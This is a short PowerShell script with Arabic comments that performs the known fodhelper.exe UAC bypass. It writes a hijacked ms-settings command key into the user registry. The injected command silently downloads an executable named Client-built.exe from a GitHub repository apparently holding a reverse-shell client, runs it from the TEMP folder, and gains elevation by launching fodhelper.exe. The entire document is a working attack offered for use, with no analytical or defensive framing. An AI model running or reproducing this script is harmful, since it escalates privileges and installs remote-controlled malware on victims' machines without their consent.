# إضافة مفاتيح الريجستري لتجاوز UAC باستخدام fodhelper.exe
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -PropertyType "String" -Value "" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -PropertyType "String" -Name "(Default)" -Value "powershell -WindowStyle Hidden -Command `Invoke-WebRequest -Uri 'https://github.com/tiraUnderCode/rev/raw/main/Client-built.exe' -OutFile $env:TEMP\Client-built.exe; Start-Process $env:TEMP\Client-built.exe`" -Force

# تشغيل fodhelper.exe لتنفيذ الأوامر المخزنة في الريجستري بصلاحيات مرتفعة
Start-Process "fodhelper.exe"
